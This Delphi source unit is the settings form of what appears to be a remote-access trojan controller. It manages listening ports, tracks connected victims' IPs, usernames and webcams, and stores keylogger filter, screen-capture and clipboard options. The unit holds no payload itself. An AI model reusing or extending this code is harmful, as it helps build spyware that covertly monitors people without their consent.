unit UnitSettings;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ScktComp, ComCtrls, XPMan, ToolWin, ImgList, CommCtrl, SHLOBJ,
  AppEvnts,ImageHlp, IniFiles, ExtCtrls, StdCtrls, Spin, Buttons, Menus,
  MPlayer;
type
  TSettings = class(TForm)
    ScrollBox1: TScrollBox;
    GroupBox1: TGroupBox;
    Label1: TLabel;
    Edit1: TEdit;
    Button1: TButton;
    CheckBox2: TCheckBox;
    Label3: TLabel;
    GroupBox2: TGroupBox;
    Label4: TLabel;
    Label5: TLabel;
    Label6: TLabel;
    Label7: TLabel;
    ColorBox3: TColorBox;
    ColorBox4: TColorBox;
    ColorBox5: TColorBox;
    ColorBox6: TColorBox;
    Label8: TLabel;
    GroupBox3: TGroupBox;
    ListView1: TListView;
    PopupMenu1: TPopupMenu;
    Remove1: TMenuItem;
    ImageList1: TImageList;
    BitBtn1: TBitBtn;
    SpinEdit2: TSpinEdit;
    CheckBox4: TCheckBox;
    GroupBox4: TGroupBox;
    CheckBox1: TCheckBox;
    CheckBox5: TCheckBox;
    Label2: TLabel;
    SpinEdit1: TSpinEdit;
    CheckBox6: TCheckBox;
    CheckBox3: TCheckBox;
    GroupBox5: TGroupBox;
    CheckBox8: TCheckBox;
    Edit2: TEdit;
    Button2: TButton;
    Label9: TLabel;
    ColorBox1: TColorBox;
    ColorBox2: TColorBox;
    OpenDialog1: TOpenDialog;
    CheckBox7: TCheckBox;
    BitBtn2: TBitBtn;
    Label10: TLabel;
    Edit3: TEdit;
    CheckBox10: TCheckBox;
    Edit4: TEdit;
    Button4: TButton;
    CheckBox11: TCheckBox;
    OpenDialog2: TOpenDialog;
    CheckBox9: TCheckBox;
    ComboBox2: TComboBox;
    Button3: TButton;
    CheckBox12: TCheckBox;
    Label11: TLabel;
    CheckBox13: TCheckBox;
    CheckBox14: TCheckBox;
    procedure FormCreate(Sender: TObject);
    procedure RadioButton1Click(Sender: TObject);
    procedure ColorBox1Change(Sender: TObject);
    procedure BitBtn1Click(Sender: TObject);
    procedure Remove1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure RadioButton2Click(Sender: TObject);
    procedure BitBtn2Click(Sender: TObject);
    procedure CheckBox10Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure CheckBox12Click(Sender: TObject);
  private
    { Private declarations }
    OriginalListViewWindowProc : TWndMethod;
    procedure ListViewWindowProcEx(var Message: TMessage);
    procedure FileList(Path: string);

  public
    { Public declarations }
    procedure AddPort(Num: integer; Active: boolean);
  end;

var
  Settings: TSettings;

implementation

{$R *.dfm}

uses
  UnitConnectionForm, UnitMain, UnitSharedData, UnitKeyLogFilter;

procedure TSettings.ListViewWindowProcEx(var Message: TMessage) ;
var
  listItem : TListItem;
  Socket: TServerSocket;
  i,x: integer;
  socketdata: tsocketdata;
  connectionform: tconnectionform;
begin
  if Message.Msg = CN_NOTIFY then
  begin
    if PNMHdr(Message.LParam)^.Code = LVN_ITEMCHANGED then
    begin
      with PNMListView(Message.LParam)^ do
      begin
        if (uChanged and LVIF_STATE) <> 0 then
        begin
          if ((uNewState and LVIS_STATEIMAGEMASK) shr 12) <> ((uOldState and LVIS_STATEIMAGEMASK) shr 12) then
          begin
            ListItem := ListView1.Items[iItem];

            Socket := TServerSocket(ListItem.Data);
            if Socket = nil then Exit;

            if ListItem.Checked then begin
              try
                Socket.Active := True;
              except
                ListItem.Checked := False;
                ShowMessage('Error');
              end;
            end else begin

              for i := 0 to Screen.FormCount -1 do begin
                if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
                ConnectionForm := TConnectionForm(Screen.Forms[i]);
                for x := ConnectionForm.ListView1.Items.Count -1 downto 0 do begin
                  SocketData := TSocketData(ConnectionForm.ListView1.Items[x].Data);
                  if SocketData = nil then Continue;
                  if SocketData.MainSocket = nil then Continue;
                  if SocketData.MainSocket.LocalPort = Socket.Port then ClientForm.DisconnectSocket(SocketData); //SocketData.MainSocket := nil;
                end;
                ConnectionForm.UpdateCaption;
              end;
              Socket.Active := False;

            end;

            //ShowMessage(Format('%s checked:%s', [listItem.Caption, BoolToStr(listItem.Checked, True)]));

          end;
        end;
      end;
    end;
  end;
  //original ListView message handling
  OriginalListViewWindowProc(Message) ;
end;

function MSecToTime(mSec: Int64): string;
const
  ticksperday: Integer    = 1000 * 60 * 60 * 24;
  ticksperhour: Integer   = 1000 * 60 * 60;
  ticksperminute: Integer = 1000 * 60;
  tickspersecond: Integer = 1000;
function AddLeadingZeroes(const aNumber, Length : integer) : string;
begin
   result := SysUtils.Format('%.*d', [Length, aNumber]) ;
end;
var
  t: int64;
  h, m, s: Integer;
begin
  t := mSec;

  //d := t div ticksperday;
  //Dec(t, d * ticksperday);

  h := t div ticksperhour;
  Dec(t, h * ticksperhour);

  m := t div ticksperminute;
  Dec(t, m * ticksperminute);

  s := t div tickspersecond;

  //Result := AddLeadingZeroes(d) + ':' +
  Result := AddLeadingZeroes(h,2) + ':' + AddLeadingZeroes(m,2) + ':' + AddLeadingZeroes(s,2);

end;

procedure TSettings.FormCreate(Sender: TObject);
var
  i,x: integer;
  Ini: TIniFile;
  ConnectionForm: TConnectionForm;
  Groups: TStringList;
  Users: TStringList;
  Li: TListItem;
  SocketData: TSOcketData;
  ServerData: TServerData;
  s,temp: string;
  Stream: TMemoryStream;
  Connections: string;
  Data: string;
begin
  Ini := TIniFile.Create(ExtractFilePath(Application.ExeName) + 'Settings.ini');

  Edit1.Text := Ini.ReadString('Settings','Users',ExtractFilePath(Application.ExeName) + 'Users\');
  ColorBox1.Selected := Ini.ReadInteger('Settings','OfflineUsers',clSilver);
  Checkbox4.Checked := ini.ReadBool('Settings','NotifyNew',CheckBox4.Checked);
  Checkbox6.Checked := ini.ReadBool('Settings','NotifyLost',CheckBox6.Checked);
  Checkbox2.Checked := ini.ReadBool('Settings','Tray',CheckBox2.Checked);

  Checkbox3.Checked := ini.ReadBool('Settings','ScreenCap',CheckBox3.Checked);
  Checkbox14.Checked := ini.ReadBool('Settings','StartScreenCap',CheckBox14.Checked);
  Checkbox7.Checked := ini.ReadBool('Settings','SpecialKeys',CheckBox7.Checked);

  ColorBox2.Selected := Ini.ReadInteger('Settings','TitleColour',clGreen);
  ColorBox3.Selected := Ini.ReadInteger('Settings','TimeColour',clBlue);
  ColorBox4.Selected := Ini.ReadInteger('Settings','KeyColour',clGray);
  ColorBox5.Selected := Ini.ReadInteger('Settings','SpecialColour',clRed);
  ColorBox6.Selected := Ini.ReadInteger('Settings','ClipboardColour',$000080FF);

  Connections := Ini.ReadString('Settings','Ports','');

  SpinEdit1.Value := Ini.ReadInteger('Settings','MaxTransfers',2);
  Checkbox5.Checked := ini.ReadBool('Settings','Skip',CheckBox5.Checked);
  Checkbox1.Checked := ini.ReadBool('Settings','Mirror',CheckBox1.Checked);

  Checkbox8.Checked := ini.ReadBool('Settings','Update',CheckBox8.Checked);
  Edit2.Text := Ini.ReadString('Settings','Server','');

  ComboBox2.Text := ini.ReadString('Settings','SkinFile',ComboBox2.Text);
  CheckBox9.Checked := ini.ReadBool('Settings','UseSkin',CheckBox9.Checked);

  Edit3.Text := Ini.ReadString('Settings','Password',Edit3.Text);
  Edit4.Text := Ini.ReadString('Settings','Sound',Edit4.Text);
  CheckBox11.Checked := ini.ReadBool('Settings','PlaySound',CheckBox11.Checked);
  Checkbox13.Checked := ini.ReadBool('Settings','Cache',CheckBox13.Checked);


  s := Ini.ReadString('Settings','KeyLogFilter','');
  while Length(s) > 0 do begin
    Data := Split(s,';',1);
    Delete(s,1,Length(Data)+1);
    Li := KeyLogFilter.ListView1.Items.Add;
    Li.Caption := Split(Data,':',1);
    Li.SubItems.Add(Split(Data,':',2));
  end;

  Checkbox12.Checked := ini.ReadBool('Settings','RemoveDeadConnections',False);

  Ini.Free;

  FileList(ExtractFilePath(Application.ExeName) + 'Skins\');

  Stream := TMemoryStream.Create;
  try
//    if not Settings.CheckBox12.Checked then Stream.LoadFromFile(Edit1.Text + 'Users.cache');
  except
  end;
  Splash.ProgressBar1.Max := Stream.Size + 14;
  Stream.Position := 0;
  SetString(Data,Pchar(Stream.Memory),Stream.Size);
  Data := DeCompress(nil,Data);
  Stream.Clear;
  Stream.Write(pointer(Data)^,Length(Data));
  Stream.Position := 0;
  while Stream.Position < Stream.Size do begin

    Stream.Read(ServerData,SizeOf(ServerData));
    Application.ProcessMessages;

    ConnectionForm := FindConnectionForm(ServerData.Group);
    ConnectionForm.ListView1.Items.BeginUpdate;

    Li := nil;

    try
      for i := 0 to ConnectionForm.ListView1.Items.Count -1 do begin
        if (ConnectionForm.ListView1.Items[i].SubItems[3] = ServerData.User) and
        (ConnectionForm.ListView1.Items[i].SubItems[2] = ServerData.Computer) then begin
          Li := ConnectionForm.ListView1.Items[i];
          if Li.Data = nil then break;
        end;
      end;
    except
    end;

    if Li <> nil then Continue;

    SocketData := TSocketData.Create;
    SocketData.ServerData := ServerData;
    SocketData.Ping := '-';
    SocketData.Idle := '-';

    Li := ConnectionForm.ListView1.Items.Add;
    Li.Caption := SocketData.ServerData.Name;
    Li.SubItems.Add(SocketData.ServerData.Lan);
    Li.SubItems.Add(SocketData.ServerData.Wan);
    Li.SubItemImages[1] := FlagFromIp(SocketData);
    Li.SubItems.Add(SocketData.ServerData.Computer);
    Li.SubItems.Add(SocketData.ServerData.User);
    Li.SubItems.Add(SocketData.ServerData.Account);
    Li.SubItems.Add(SocketData.ServerData.Os);
    Li.SubItems.Add(SocketData.ServerData.Processor + ' Mhz');
    try
      Li.SubItems.Add(FileSizeToSTr(strtoint(SocketData.ServerData.Memory)));
    except
      Li.Delete;
      SocketData.Free;
      Continue;
    end;

    Li.SubItems.Add(SocketData.ServerData.Webcam);
    if SocketData.ServerData.Webcam = 'Detected' then Li.SubItemImages[8] := 2 else Li.SubItemImages[8] := 3;
    Li.SubItems.Add(SocketData.ServerData.Version);
    Li.SubItems.Add(SocketData.Ping);
    Li.SubItems.Add(SocketData.Idle);
    Li.Data := SocketData;
    SocketData.ListItem := Li;
    SocketData.ConnectionForm := ConnectionForm;
    Li.ImageIndex := 0;

    if SocketData.ServerData.Special = 'True' then Li.StateIndex := 1 else Li.StateIndex := 0;

    SocketData.MainPath := Settings.Edit1.Text + SocketData.ServerData.Computer + '\' + SocketData.ServerData.User + '\';
    SocketData.ScreenPath := SocketData.MainPath + 'Screen\';
    SocketData.WebcamPath := SocketData.MainPath + 'Webcam\';
    SocketData.DownloadPath := SocketData.MainPath + 'Downloads\';
    SocketData.AudioPath := SocketData.MainPath + 'Audio\';
    SocketData.CachePath := SocketData.MainPath + 'Cache\';

    MakeSureDirectoryPathExists(pchar(SocketData.ScreenPath));
    MakeSureDirectoryPathExists(pchar(SocketData.WebcamPath));
    MakeSureDirectoryPathExists(pchar(SocketData.DownloadPath));
    MakeSureDirectoryPathExists(pchar(SocketData.AudioPath));
    MakeSureDirectoryPathExists(pchar(SocketData.CachePath));

    SocketData.ConnectionForm := ConnectionForm;
    ConnectionForm.UpdateCaption;
    ConnectionForm.ListView1.Items.EndUpdate;
    Splash.ProgressBar1.Position := Stream.Position;
    
  end;

  Stream.Free;
  ClientForm.PageControl1.Visible := (ClientForm.PageControl1.PageCount > 0);
  ClientForm.PageControl1.BringToFront;

  OriginalListViewWindowProc := ListView1.WindowProc;
  ListView1.WindowProc := ListViewWindowProcEx;

  while Length(Connections) > 0 do begin
    temp := split(Connections,';',1);
    Delete(Connections,1,Length(Temp)+1);
    AddPort(strtoint(split(Temp,':',1)),strtobool(split(Temp,':',2))) ;
  end;


end;

procedure TSettings.RadioButton1Click(Sender: TObject);
var
  i,x: integer;
  ConnectionFOrm: TConnectionForm;
  SocketData: TSocketData;
begin
  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    ConnectionForm := TConnectionForm(Screen.Forms[i]);
    for x := 0 to ConnectionForm.ListView1.Items.Count -1 do begin
      SocketData := TSocketData(ConnectionForm.ListView1.Items[x].Data);
      ConnectionForm.ListView1.Items[x].SubItemImages[1] := FlagFromCountry(SocketData);
    end;
  end;
end;

procedure TSettings.ColorBox1Change(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    TConnectionForm(Screen.Forms[i]).ListView1.Refresh;
  end;
end;

procedure TSettings.AddPort(Num: integer; Active: boolean);
var
  Li: TListItem;
  Socket: TServerSocket;
begin
  Socket := TServerSocket.Create(nil);
  Socket.Port := num;

  //Socket.OnClientConnect := ClientForm.ServerSocket1ClientConnect;
  Socket.OnClientDisconnect := ClientForm.ServerSocket1ClientDisconnect;
  Socket.OnClientRead := ClientForm.ServerSocket1ClientRead;
  Socket.OnClientError := ClientForm.ServerSocket1ClientError;
  //Socket.OnClientWrite := CLientForm.ServerSocket1ClientWrite;

  Li := Listview1.Items.Add;
  Li.Caption := inttostr(Num);
  Li.Data := Socket;
  Li.Checked := Active;

end;

procedure TSettings.BitBtn1Click(Sender: TObject);
begin
  AddPort(SpinEdit2.Value,True);
end;

procedure TSettings.Remove1Click(Sender: TObject);
begin
  if not assigned(Listview1.Selected) then exit;
  Listview1.Selected.Checked := False;
  Listview1.Selected.Delete;
end;

function List2String(Li: TListview): string;
var
  i,x: integer;
begin
  for x := 0 to Li.Items.Count -1 do begin
    Result := Result + Li.Items[x].Caption + ':' + BoolToStr(Li.Items[x].Checked) + ';';
  end;
end;

procedure TSettings.FormClose(Sender: TObject; var Action: TCloseAction);
var
  Ini: TIniFile;
  s: string;
  i: integer;
begin
  Ini := TIniFile.Create(ExtractFilePath(Application.ExeName) + 'Settings.ini');

  Ini.WriteString('Settings','Users',Edit1.Text);
  Ini.WriteInteger('Settings','OfflineUsers',ColorBox1.Selected);
  ini.WriteBool('Settings','NotifyNew',CheckBox4.Checked);
  ini.WriteBool('Settings','NotifyLost',CheckBox6.Checked);
  ini.WriteBool('Settings','Tray',CheckBox2.Checked);
  ini.WriteBool('Settings','ScreenCap',CheckBox3.Checked);
  ini.WriteBool('Settings','StartScreenCap',CheckBox14.Checked); 
  ini.WriteBool('Settings','SpecialKeys',CheckBox7.Checked);

  Ini.WriteInteger('Settings','TitleColour',ColorBox2.Selected);
  Ini.WriteInteger('Settings','TimeColour',ColorBox3.Selected);
  Ini.WriteInteger('Settings','KeyColour',ColorBox4.Selected);
  Ini.WriteInteger('Settings','SpecialColour',ColorBox5.Selected);
  Ini.WriteInteger('Settings','ClipboardColour',ColorBox6.Selected);

  ini.WriteString('Settings','Ports',List2String(Listview1));

  Ini.WriteInteger('Settings','MaxTransfers',SpinEdit1.Value);
  ini.WriteBool('Settings','Skip',CheckBox5.Checked);
  ini.WriteBool('Settings','Mirror',CheckBox1.Checked);

  ini.WriteBool('Settings','UseSkin',CheckBox9.Checked);
  ini.WriteString('Settings','SkinFile',ComboBox2.Text);

  ini.WriteBool('Settings','Update',CheckBox8.Checked);
  Ini.WriteString('Settings','Server',Edit2.Text);

  Ini.WriteString('Settings','Password',Edit3.Text);
  Ini.WriteString('Settings','Sound',Edit4.Text);
  Ini.WriteBool('Settings','PlaySound',CheckBox11.Checked);
  Ini.WriteBool('Settings','RemoveDeadConnections',Checkbox12.Checked);
  Ini.WriteBool('Settings','Cache',CheckBox13.Checked);



  for i := 0 to KeyLogFilter.ListView1.Items.Count -1 do begin
    s := s + KeyLogFilter.ListView1.Items[i].Caption + ':' + KeyLogFilter.ListView1.Items[i].SubItems[0] + ';'
  end;
  Ini.WriteString('Settings','KeyLogFilter',s);

  Ini.Free;
end;

function BrowseForFolder(var Foldr: string; Title: string): Boolean;
var
  BrowseInfo: TBrowseInfo;
  ItemIDList: PItemIDList;
  DisplayName: array[0..MAX_PATH] of Char;
begin
  Result := False;
  FillChar(BrowseInfo, SizeOf(BrowseInfo), #0);
  with BrowseInfo do begin
    hwndOwner := Application.Handle;
    pszDisplayName := @DisplayName[0];
    lpszTitle := PChar(Title);
    ulFlags := BIF_RETURNONLYFSDIRS;
  end;
  ItemIDList := SHBrowseForFolder(BrowseInfo);
  if Assigned(ItemIDList) then
    if SHGetPathFromIDList(ItemIDList, DisplayName) then begin
      Foldr := DisplayName;
      Result := True;
    end;
end;

procedure TSettings.Button1Click(Sender: TObject);
var
  f: string;
begin
  if not BrowseForFolder(f,'Select User Directory') then exit;
  Edit1.Text := f;
end;

procedure TSettings.Button2Click(Sender: TObject);
begin
  if not opendialog1.Execute then exit;
  edit2.Text := opendialog1.FileName;
end;

procedure TSettings.RadioButton2Click(Sender: TObject);
var
  i,x: integer;
  ConnectionFOrm: TConnectionForm;
  SocketData: TSocketData;
begin
  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    ConnectionForm := TConnectionForm(Screen.Forms[i]);
    for x := 0 to ConnectionForm.ListView1.Items.Count -1 do begin
      SocketData := TSocketData(ConnectionForm.ListView1.Items[x].Data);
      ConnectionForm.ListView1.Items[x].SubItemImages[1] := FlagFromIp(SocketData);
    end;
  end;
end;

function GetAttrib(FindData: TWIN32FindData):string;
begin
  if FindData.dwFileAttributes and $00000010 <> 0 then begin
    Result := 'File Folder';
  end else begin
    if FindData.dwFileAttributes and $00000020 <> 0 then Result := Result + 'A';
    if FindData.dwFileAttributes and $00000002 <> 0 then Result := Result + 'H';
    if FindData.dwFileAttributes and $00000001 <> 0 then Result := Result + 'R';
    if FindData.dwFileAttributes and $00000004 <> 0 then Result := Result + 'S';
  end;
end;

procedure TSettings.FileList(Path: string);
var
  FindData: TWIN32FindData;
  hFind: THandle;
begin
  path := includetrailingbackslash(path);
  hFind := FindFirstFile(pchar(Path + '*.skn'), FindData);
  if hFind = INVALID_HANDLE_VALUE then exit;
  if GetAttrib(FindData) <> 'File Folder' then Combobox2.Items.Add(FindData.cFileName);
  while FindNextFile(hFind, FindData) do begin
    if GetAttrib(FindData) <> 'File Folder' then Combobox2.Items.Add(FindData.cFileName);
  end;
  Windows.FindClose(hFind);
end;

procedure TSettings.BitBtn2Click(Sender: TObject);
begin
  KeyLogFilter.Show;
end;

procedure TSettings.CheckBox10Click(Sender: TObject);
begin
  if Checkbox10.Checked then begin
    Edit3.PasswordChar := '*';
    Edit3.Font.Style := [fsBold];
  end else begin
    Edit3.PasswordChar := #0;
    Edit3.Font.Style := [];
  end;
end;

procedure TSettings.Button4Click(Sender: TObject);
begin
  if not opendialog2.Execute then exit;
  edit4.Text := opendialog2.FileName;
end;

procedure TSettings.CheckBox12Click(Sender: TObject);
var
 i,x: integer;
 ConnectionForm: TCOnnectionForm;
 SocketData: TSocketData;
begin
  if not CheckBox12.Checked then exit;

  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    ConnectionForm := TConnectionForm(Screen.Forms[i]);
    for x := ConnectionForm.ListView1.Items.Count -1 downto 0 do begin
      SocketData := TSocketData(ConnectionForm.ListView1.Items[x].Data);
      if SocketData = nil then Continue;
      if SocketData.MainSocket = nil then ClientForm.DisconnectSocket(SocketData);
    end;
    ConnectionForm.UpdateCaption;
  end;

end;

end.
